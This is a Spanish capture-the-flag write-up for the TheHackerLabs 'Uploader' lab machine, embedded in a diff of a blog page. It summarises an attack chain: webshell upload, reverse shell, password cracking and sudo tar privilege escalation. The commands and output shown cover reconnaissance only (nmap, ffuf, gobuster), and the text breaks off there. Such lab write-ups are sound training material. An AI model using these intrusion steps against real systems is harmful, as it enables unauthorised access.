@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Uploader - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-uploader/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Uploader - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-uploader/uploader.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-elCliente/">
+          <span class="side-post-card-title">El Cliente</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-darkZero/">
+          <span class="side-post-card-title">DarkZero</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Uploader</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-imagery/">
+          <span class="side-post-card-title">Imagery</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-elCandidato/">
+          <span class="side-post-card-title">El Candidato</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Uploader - TheHackerLabs</h1>
+    <div class="post-meta">8 October 2025 · 12 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-uploader/uploader.png" alt="Uploader - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta es una máquina bastante sencilla. Después de analizar los escaneos, nos dedicamos a analizar la página web activa en el puerto 80. Vemos que es posible subir archivos de cualquier tipo y aplicamos Fuzzing para descubrir en qué directorio se guardan. Abusamos de esta carga de archivos sin filtros para cargar una Webshell de PHP, con la que logramos obtener una Reverse Shell, ganando acceso principal a la máquina víctima. Dentro, una pista nos indica la existencia de un archivo ZIP, que encontramos y crackeamos, obteniendo la contraseña de otro usuario codificada en MD5. Crackeamos la contraseña y nos logueamos como otro usuario de la máquina. Revisamos los privilegios de nuestro usuario y vemos que podemos usar el binario tar como Root. Utilizamos la guía de GTFOBins para encontrar una forma de escalar privilegios usando el binario tar, convirtiéndonos en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>Wappalizer</code></li><li><code>ffuf</code></li><li><code>gobuster</code></li><li><code>echo</code></li><li><code>cat</code></li><li><code>nc</code></li><li><code>grep</code></li><li><code>find</code></li><li><code>which</code></li><li><code>python3</code></li><li><code>wget</code></li><li><code>7z</code></li><li><code>zip2john</code></li><li><code>zipinfo</code></li><li><code>JohnTheRipper</code></li><li><code>su</code></li><li><code>sudo</code></li><li><code>tar</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Webshell">Abusando de Carga de Archivos para Cargar Webshell de PHP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima</a></li>
+        <li><a href="#Cracking">Crackeando Archivo ZIP y Contraseña Codificada en MD5 de Usuario operatorx</a></li>
+        <li><a href="#tar">Abusando de Permisos Sudoers Sobre Binario tar para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Webshell">Abusando de Carga de Archivos para Cargar Webshell de PHP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima</a></li>
+        <li><a href="#Cracking">Crackeando Archivo ZIP y Contraseña Codificada en MD5 de Usuario operatorx</a></li>
+        <li><a href="#tar">Abusando de Permisos Sudoers Sobre Binario tar para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.100.160
+</span></span><span style="display:flex;"><span>PING 192.168.100.160 <span style="color:#f92672">(</span>192.168.100.160<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.160: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>3.02 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.160: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>3.52 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.160: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>2.19 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.160: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.27 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.100.160 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3103ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 1.274/2.502/3.523/0.854 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.100.160 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-10-07 22:01 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 22:01
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.160 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 22:01, 0.10s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 22:01
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.160 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.100.160
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 22:01, 10.17s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.160
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.0013s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-10-07 22:01:18 CST <span style="color:#66d9ef">for</span> 10s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.44 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Obtuvimos solo un puerto abierto, siendo el <strong>puerto 80</strong>, por lo que la intrusión será por una página web.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p <span style="color:#ae81ff">80</span> 192.168.100.160 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-10-07 22:03 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.160
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0013s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.58 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Uploader File Storage
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.58 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.21 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>El escaneo nos muestra el título de la página web, por lo que no parece solo ser la página por defecto de <strong>Apache2</strong>.</p>
+<p>Vamos a analizarla.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura1.png">
+</p>
+<p>Es una página dedicada a subir y guardar archivos en la nube.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura2.png">
+</p>
+<p>No nos dice mucho.</p>
+<p>Dándole clic al botón central para subir archivos, nos envía a una página de PHP que permite la subida de archivos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura3.png">
+</p>
+<p>Si revisamos el código fuente de esta página, no vemos algún mensaje que indique el tipo de archivos aceptados como un filtro o una sanitización a la hora de subirlos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura4.png">
+</p>
+<p>Aunque estas funciones pueden estar ocultas trabajando en el Backend.</p>
+<p>Tratemos de subir un archivo de texto simple.</p>
+<p>Créalo primero:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Esto es un test&#34;</span> &gt; test.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat test.txt
+</span></span><span style="display:flex;"><span>Esto es un test
+</span></span></code></pre></div><p>Ahora lo subimos y vemos la respuesta:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-uploader/Captura5.png">
+</p>
+<p>Observa que la página nos dan un ID para el archivo subido, que suponemos, es el nuevo nombre del archivo o algo relacionado con este.</p>
+<p>El problema es que no sabemos a dónde se están subiendo, por lo que podemos aplicar <strong>Fuzzing</strong> para identificar directorios o archivos ocultos.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Al ver que la página fue creada en <strong>PHP</strong>, quizá existan más archivos de este tipo, así que enfoquemos el <strong>Fuzzing</strong> a esto.</p>
+<p>Primero usaremos la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.160/FUZZ -t <span style="color:#ae81ff">300</span> -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.100.160/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>index.html              <span style="color:#f92672">[</span>Status: 200, Size: 3968, Words: 1429, Lines: 140, Duration: 29ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>uploads                 <span style="color:#f92672">[</span>Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 6ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>upload.php              <span style="color:#f92672">[</span>Status: 200, Size: 3277, Words: 1202, Lines: 114, Duration: 7ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 15ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.html                   <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 42ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 3968, Words: 1429, Lines: 140, Duration: 111ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 509ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>882180/882180<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">238</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:13:29<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">689</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-e</em></td>
+					<td>Para indicar una busqueda de archivos específicos.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probamos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.100.160 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">300</span> -x php,txt,html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.100.160
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.8
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,txt,html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 320<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.100.160/uploads/<span style="color:#f92672">]</span>
